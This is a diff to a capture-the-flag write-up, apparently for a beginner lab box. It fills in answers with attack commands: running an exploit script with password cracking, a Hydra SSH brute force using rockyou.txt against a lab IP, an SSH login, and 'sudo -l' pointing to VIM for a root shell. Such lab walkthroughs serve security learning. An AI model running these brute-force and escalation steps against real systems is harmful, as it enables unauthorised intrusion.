@@ -33,13 +33,16 @@ A. SQLi
 
 **What's the password?**
 
-  ~#python 46635.py -u http://10.10.176.184/simple/ --crack -w /usr/share/wordlists/dirb/common.txt
+    ~#python 46635.py -u http://10.10.176.184/simple/ --crack -w /usr/share/wordlists/dirb/common.txt
+  
+  ~#hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.176.184:2222
+
 
 
 **Where can you login with the details obtained?**
 
 
-
+    ~# ssh -p2222 mitch@10.10.176.184
 
 **What's the user flag?**
 
@@ -48,13 +51,14 @@ A. SQLi
 
 **Is there any other user in the home directory? What's its name?**
 
-
+sunbath
 
 
 **What can you leverage to spawn a privileged shell?**
 
-
-
+   ~#sudo -l
+ 
+A. VIM
 
 **What's the root flag?**
 
